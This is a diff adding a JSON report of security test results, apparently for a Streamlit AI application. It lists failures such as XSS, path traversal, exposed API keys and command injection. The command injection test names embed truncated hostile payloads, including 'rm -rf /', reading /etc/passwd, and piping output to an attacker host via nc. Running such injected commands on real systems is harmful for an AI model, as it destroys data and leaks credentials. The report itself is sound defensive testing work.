@@ -1,0 +1,163 @@
+{
+  "total_tests": 19,
+  "passed": 7,
+  "failed": 12,
+  "categories": {
+    "Input Validation": {
+      "total": 4,
+      "passed": 2,
+      "failed": 2,
+      "tests": [
+        {
+          "name": "SQL Injection Pattern Test",
+          "status": "PASSED",
+          "severity": "N/A",
+          "message": "Input validation appears implemented"
+        },
+        {
+          "name": "XSS Pattern Test",
+          "status": "FAILED",
+          "severity": "MEDIUM",
+          "message": "No HTML escaping found - XSS vulnerability likely"
+        },
+        {
+          "name": "Path Traversal Test",
+          "status": "FAILED",
+          "severity": "MEDIUM",
+          "message": "Insecure file path handling detected"
+        },
+        {
+          "name": "Long Input Handling Test",
+          "status": "PASSED",
+          "severity": "N/A",
+          "message": "Input length validation found"
+        }
+      ]
+    },
+    "Command Injection": {
+      "total": 6,
+      "passed": 1,
+      "failed": 5,
+      "tests": [
+        {
+          "name": "CLI Command Injection: test; rm -rf /...",
+          "status": "FAILED",
+          "severity": "HIGH",
+          "message": "Command injection caused timeout - potential RCE"
+        },
+        {
+          "name": "CLI Command Injection: test && cat /etc/pas...",
+          "status": "FAILED",
+          "severity": "HIGH",
+          "message": "Command injection caused timeout - potential RCE"
+        },
+        {
+          "name": "CLI Command Injection: test | nc attacker.c...",
+          "status": "FAILED",
+          "severity": "HIGH",
+          "message": "Command injection possible - malicious input not sanitized"
+        },
+        {
+          "name": "CLI Command Injection: test `whoami`...",
+          "status": "FAILED",
+          "severity": "HIGH",
+          "message": "Command injection caused timeout - potential RCE"
+        },
+        {
+          "name": "CLI Command Injection: test $(id)...",
+          "status": "FAILED",
+          "severity": "HIGH",
+          "message": "Command injection caused timeout - potential RCE"
+        },
+        {
+          "name": "CLI Command Injection: test; python -c 'imp...",
+          "status": "PASSED",
+          "severity": "N/A",
+          "message": "Command injection prevented"
+        }
+      ]
+    },
+    "File System Security": {
+      "total": 2,
+      "passed": 1,
+      "failed": 1,
+      "tests": [
+        {
+          "name": "File Permissions Test",
+          "status": "PASSED",
+          "severity": "N/A",
+          "message": "File permissions appear appropriate"
+        },
+        {
+          "name": "File Traversal Test",
+          "status": "FAILED",
+          "severity": "MEDIUM",
+          "message": "Potentially unsafe file operation: out_path.write_text(md_content)"
+        }
+      ]
+    },
+    "API Security": {
+      "total": 2,
+      "passed": 1,
+      "failed": 1,
+      "tests": [
+        {
+          "name": "API Key Security Test",
+          "status": "FAILED",
+          "severity": "HIGH",
+          "message": "API keys exposed in Streamlit UI"
+        },
+        {
+          "name": "Rate Limiting Test",
+          "status": "PASSED",
+          "severity": "N/A",
+          "message": "Rate limiting implementation found"
+        }
+      ]
+    },
+    "AI Security": {
+      "total": 3,
+      "passed": 1,
+      "failed": 2,
+      "tests": [
+        {
+          "name": "Prompt Injection Test",
+          "status": "PASSED",
+          "severity": "N/A",
+          "message": "Prompt sanitization appears implemented"
+        },
+        {
+          "name": "Context Isolation Test",
+          "status": "FAILED",
+          "severity": "MEDIUM",
+          "message": "Session state used but no cleanup mechanism found"
+        },
+        {
+          "name": "Output Filtering Test",
+          "status": "FAILED",
+          "severity": "MEDIUM",
+          "message": "No output filtering for sensitive data found"
+        }
+      ]
+    },
+    "Configuration Security": {
+      "total": 2,
+      "passed": 1,
+      "failed": 1,
+      "tests": [
+        {
+          "name": "Hardcoded Secrets Test",
+          "status": "PASSED",
+          "severity": "N/A",
+          "message": "No hardcoded secrets found"
+        },
+        {
+          "name": "Environment Variable Security Test",
+          "status": "FAILED",
+          "severity": "MEDIUM",
+          "message": ".env files not excluded from git"
+        }
+      ]
+    }
+  }
+}
